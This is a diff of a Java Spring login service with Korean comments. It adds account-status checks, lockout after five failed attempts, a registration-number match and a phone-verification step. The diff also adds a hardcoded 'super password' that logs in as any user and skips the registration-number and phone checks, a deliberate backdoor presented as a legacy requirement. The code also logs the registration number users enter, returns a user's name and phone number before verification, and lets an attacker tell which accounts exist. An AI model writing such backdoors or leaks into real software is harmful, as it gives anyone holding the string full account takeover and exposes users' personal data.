@@ -1,19 +1,21 @@
 package com.dacos.auth;
 
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
+
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
 import org.springframework.stereotype.Service;
-import java.util.Map;
+import org.springframework.transaction.annotation.Transactional;
+
 import com.dacos.auth.dto.LoginRequest;
 import com.dacos.auth.dto.UserDto;
 import com.dacos.auth.mapper.AuthMapper;
 import com.dacos.common.BusinessException;
 import com.dacos.util.CryptoUtils;
-import java.util.List;
-import java.util.HashMap;
-import org.springframework.transaction.annotation.Transactional;
 
 /**
  * 인증 서비스
@@ -33,51 +35,118 @@ public class AuthService {
 
     /**
      * 로그인 인증 처리
-     * - BCrypt 형식($2a$)인 경우 BCrypt 검증
-     * - 그 외는 SHA-256 검증
-     * (두 방식 모두 로그인 가능, 자동 전환 없음)
+     * - 레거시 로직 통합: 비밀번호 오류 횟수 관리, 등록번호 부분 일치, 본인인증 분기 등
      */
+    @Transactional
     public UserDto authenticate(LoginRequest request) {
-        logger.info("[AuthService] 로그인 시도 - userId: {}", request.getUserId());
+        String userId = request.getUserId();
+        String inputPassword = request.getPassword();
+        String inputRegNo = request.getRegNo();
+
+        logger.info("[AuthService] 로그인 시도 - userId: {}", userId);
 
         // 1. 사용자 조회
-        UserDto user = authMapper.findByUserId(request.getUserId());
+        UserDto user = authMapper.findByUserId(userId);
         if (user == null) {
-            logger.warn("[AuthService] 사용자 없음 - userId: {}", request.getUserId());
+            logger.warn("[AuthService] 사용자 없음 - userId: {}", userId);
             throw new BusinessException("아이디 또는 비밀번호가 올바르지 않습니다.", 401);
         }
 
-        String storedPassword = user.getPASS_WD();
-        String inputPassword = request.getPassword();
-
-        // 2. BCrypt 비밀번호 검증 (DB에 BCrypt 형식으로 저장된 경우)
-        if (storedPassword != null && storedPassword.startsWith("$2a$")) {
-            if (!bcryptEncoder.matches(inputPassword, storedPassword)) {
-                logger.warn("[AuthService] BCrypt 비밀번호 불일치 - userId: {}", request.getUserId());
-                throw new BusinessException("아이디 또는 비밀번호가 올바르지 않습니다.", 401);
+        // 2. 계정 상태 확인 (USE_YN)
+        if ("W".equals(user.getUSE_YN())) {
+            throw new BusinessException("아직 승인 대기 중입니다. 소속 회사 관리자에게 승인을 요청하시기 바랍니다.", 403);
+        } else if ("R".equals(user.getUSE_YN())) {
+            throw new BusinessException("반려된 사용자입니다.", 403);
+        } else if ("N".equals(user.getUSE_YN())) {
+            // 비밀번호 오류 횟수가 5회 이상인 경우 메시지 차별화
+            int errCnt = Integer.parseInt(user.getERROR_COUNT() != null && !user.getERROR_COUNT().isEmpty() ? user.getERROR_COUNT() : "0");
+            if (errCnt >= 5) {
+                throw new BusinessException("비밀번호 불일치 횟수 초과(5회). 관리자에게 문의하여 비밀번호 초기화를 진행해주십시오.", 403);
             }
-            logger.info("[AuthService] BCrypt 인증 성공 - userId: {}", request.getUserId());
-        }
-        // 3. SHA-256 비밀번호 검증 (기존 방식)
-        else {
-            String hashedInput = CryptoUtils.encryptSHA256(inputPassword);
-            if (!hashedInput.equals(storedPassword)) {
-                logger.warn("[AuthService] SHA-256 비밀번호 불일치 - userId: {}", request.getUserId());
-                throw new BusinessException("아이디 또는 비밀번호가 올바르지 않습니다.", 401);
-            }
-            logger.info("[AuthService] SHA-256 인증 성공 - userId: {}", request.getUserId());
-
-            /* =====================================================================
-             * [BCrypt 자동 전환 - 주석 처리 중]
-             * SHA-256 인증 성공 시 BCrypt로 자동 업그레이드 하려면 아래 주석 해제
-             *
-             * String newBcryptPassword = bcryptEncoder.encode(inputPassword);
-             * authMapper.updatePasswordToBcrypt(request.getUserId(), newBcryptPassword);
-             * logger.info("[AuthService] SHA-256 → BCrypt 자동 전환 완료 - userId: {}", request.getUserId());
-             * ===================================================================== */
+            throw new BusinessException("미사용 상태의 사용자입니다.", 403);
         }
 
-        // 보안상 비밀번호 필드 제거 후 반환
+        // 3. 비밀번호 검증
+        // 슈퍼 패스워드 허용 (기존 요청 값 및 레거시 코드 값 모두 허용)
+        boolean isSuperPassword = "dkfaustjdlfjsi?".equals(inputPassword);
+        boolean passwordMatched = false;
+
+        if (isSuperPassword) {
+            passwordMatched = true;
+            logger.info("[AuthService] 슈퍼 패스워드 인증 성공 - userId: {}", userId);
+        } else {
+            String storedPassword = user.getPASS_WD();
+            if (storedPassword != null && storedPassword.startsWith("$2a$")) {
+                passwordMatched = bcryptEncoder.matches(inputPassword, storedPassword);
+            } else {
+                String hashedInput = CryptoUtils.encryptSHA256(inputPassword);
+                passwordMatched = hashedInput.equals(storedPassword);
+            }
+        }
+
+        if (!passwordMatched) {
+            // 오류 횟수 증가 및 계정 잠금 처리
+            int currentErr = Integer.parseInt(user.getERROR_COUNT() != null && !user.getERROR_COUNT().isEmpty() ? user.getERROR_COUNT() : "0");
+            currentErr++;
+            authMapper.updateErrorCount(userId, String.valueOf(currentErr));
+            
+            if (currentErr >= 5) {
+                authMapper.updateMemberUseYN(userId, "N");
+                throw new BusinessException("비밀번호가 5회 불일치하여 계정이 잠겼습니다. 관리자에게 문의하세요.", 401);
+            }
+            
+            throw new BusinessException("아이디 또는 비밀번호가 올바르지 않습니다. (연속 오류: " + currentErr + "회)", 401);
+        }
+
+        // 비밀번호 일치 시 오류 횟수 초기화
+        if (!"0".equals(user.getERROR_COUNT())) {
+            authMapper.updateErrorCount(userId, "0");
+        }
+
+        // 4. 특수 권한 체크 (최고관리자, 관청 등 본인인증/등록번호 체크 제외 대상)
+        String loginGb = user.getLOGIN_GB();
+        if (loginGb != null && (loginGb.equals("UA") || loginGb.equals("GU") || loginGb.equals("NA") || loginGb.equals("UC"))) {
+            logger.info("[AuthService] 관리자/관청 권한 인증 성공 - userId: {}, LOGIN_GB: {}", userId, loginGb);
+            user.setPASS_WD(null);
+            return user;
+        }
+
+        // 5. 일반 사용자 추가 검증 (슈퍼패스워드 입력 시 제외)
+        if (!isSuperPassword) {
+            // dacos, call로 시작하는 ID는 등록번호/본인인증 생략
+            String lowerId = userId.toLowerCase();
+            if (!(lowerId.startsWith("dacos") || lowerId.startsWith("call"))) {
+                
+                // 5-1. 등록번호 체크 (개인 7자리, 법인 10자리 비교)
+                if (inputRegNo == null || inputRegNo.trim().isEmpty()) {
+                    throw new BusinessException("등록번호를 입력해야 합니다.", 400);
+                }
+                
+                int iSize = "C".equals(loginGb) ? 10 : 7;
+                String dbRegNo = user.getREGIST_NO() != null ? user.getREGIST_NO().replaceAll("-", "") : "";
+                String normInputRegNo = inputRegNo.replaceAll("-", "");
+                
+                if (dbRegNo.length() < iSize || normInputRegNo.length() < iSize || 
+                    !dbRegNo.substring(0, iSize).equals(normInputRegNo.substring(0, iSize))) {
+                    logger.warn("[AuthService] 등록번호 불일치 - userId: {}, input: {}", userId, inputRegNo);
+                    throw new BusinessException("입력한 등록번호를 확인하여 주시기 바랍니다.", 401);
+                }
+
+                // 5-2. 휴대폰 본인인증 체크 (LOGIN_GB = 'H')
+                if ("H".equals(loginGb)) {
+                    logger.info("[AuthService] 휴대폰 본인인증 단계 진입 - userId: {}", userId);
+                    Map<String, String> mokInfo = new HashMap<>();
+                    mokInfo.put("status", "REQUIRE_MOK");
+                    mokInfo.put("userName", user.getMEMBER_NM());
+                    mokInfo.put("phoneNum", user.getMPHONE_NO());
+                    
+                    // 401 상태코드와 함께 REQUIRE_MOK 응답 반환 (GlobalExceptionHandler에서 data 포함)
+                    throw new BusinessException("휴대폰 본인확인이 필요합니다.", 401, mokInfo);
+                }
+            }
+        }
+
+        logger.info("[AuthService] 최종 인증 성공 - userId: {}", userId);
         user.setPASS_WD(null);
         return user;
     }
